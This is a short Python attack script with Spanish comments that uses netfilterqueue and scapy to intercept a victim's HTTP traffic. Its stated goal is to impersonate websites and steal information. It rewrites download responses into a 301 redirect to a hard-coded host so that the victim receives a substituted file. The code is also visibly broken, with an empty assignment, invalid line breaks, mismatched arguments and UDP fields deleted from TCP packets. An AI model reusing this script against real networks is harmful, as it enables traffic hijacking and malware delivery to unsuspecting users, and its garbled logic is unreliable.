#!/usr/bin/env python3

"""replace downlads
Suplantaremos una página web que un usuario quiera acceder
haciándonos pasar por ella, permitiéndonos robarle información
"""

import netfilterqueue
import scapy.all as scapy
import re


ack_list = 
ptr_ = "Accept-Encoding:.*?\\r\\n"

def set_load(packet, action):

    __do = None

    if action == 301:
        __do = "http/1.1  301 Moved Permanently" +
                    "\nLocation: http://19.0.2.6\n"
    else:
        return None

    packet[scapy.Raw].load = __do

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum

    return packet


def catch_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #  dport -> destination port asique petición
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            mod_load = re.sub(ptr_, "", scapy_packet[scapy.Raw].load)
            edit_load = set_load(scapy_packet, mod_load)
            packet.set_payload(str(edit_load))
            print(scapy_packet.show())
        #  sport -> source port asique salida
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                #  Si este paquete ya hemos indetificado por la ack/seq que
                #  corresponde a una petición de descarga, sustituimos el
                #  fichero esperado por uno de nuestra incunbencia
                print("Replacing packet")
                mod_packet = set_load(scapy_packet, 301)
                #  Guardamos el paquete con la nueva peptición
                packet.set_payload(str(mod_packet))
                print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.Netfilterqueue()
queue.bind(0, catch_packet)
queue.run()
